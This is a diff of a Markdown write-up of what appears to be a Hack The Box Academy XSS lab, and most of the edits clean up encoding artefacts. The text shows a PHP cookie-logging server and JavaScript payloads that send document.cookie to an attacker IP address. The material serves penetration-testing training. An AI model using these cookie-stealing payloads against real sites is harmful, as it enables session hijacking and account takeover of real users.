@@ -1,19 +1,17 @@
 ﻿---
 sticker: lucide//code
 ---
-We are performing a Web Application Penetration Testing task for a company that hired you, which just released their newÂ `Security Blog`. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).
+We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new`Security Blog`. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).
 
-Start the server below, make sure you are connected to the VPN, and access theÂ `/assessment`Â directory on the server using the browser:
+Start the server below, make sure you are connected to the VPN, and access the`/assessment` directory on the server using the browser:
 
-Â Â Â 
-
-![](https://academy.hackthebox.com/storage/modules/103/xss_skills_assessment_website.jpg)
+ ![](https://academy.hackthebox.com/storage/modules/103/xss_skills_assessment_website.jpg)
 
 Apply the skills you learned in this module to achieve the following:
 
 1. Identify a user-input field that is vulnerable to an XSS vulnerability
 2. Find a working XSS payload that executes JavaScript code on the target's browser
-3. Using theÂ `Session Hijacking`Â techniques, try to steal the victim's cookies, which should contain the flag
+3. Using the`Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag
 
 
 ### Identifying the vulnerable parameter
@@ -30,21 +28,21 @@ If we go to the `Welcome to Security Blog` URL, we can see the following:
 At first glance, the comments section seems vulnerable to XSS, let's test some simple payload to check the behavior of the web application, we can set up the same PHP server form the [Session Hijacking](XSS%20Attacks/Session%20Hijacking.md) section:
 
 ```php
-<?php  
-if (isset($_GET['c'])) {  
-$list = explode(";", $_GET['c']);  
-foreach ($list as $key => $value) {  
-$cookie = urldecode($value);  
-$file = fopen("cookies.txt", "a+");  
-fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");  
-fclose($file);  
-}  
-}  
+<?php 
+if (isset($_GET['c'])) { 
+$list = explode(";", $_GET['c']); 
+foreach ($list as $key => $value) { 
+$cookie = urldecode($value); 
+$file = fopen("cookies.txt", "a+"); 
+fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"); 
+fclose($file); 
+} 
+} 
 ?>
 ```
 
 ```js
-document.location='http://10.10.15.141/index.php?c='+document.cookie;  
+document.location='http://10.10.15.141/index.php?c='+document.cookie; 
 new Image().src='http://10.10.15.141/index.php?c='+document.cookie;
 ```
 
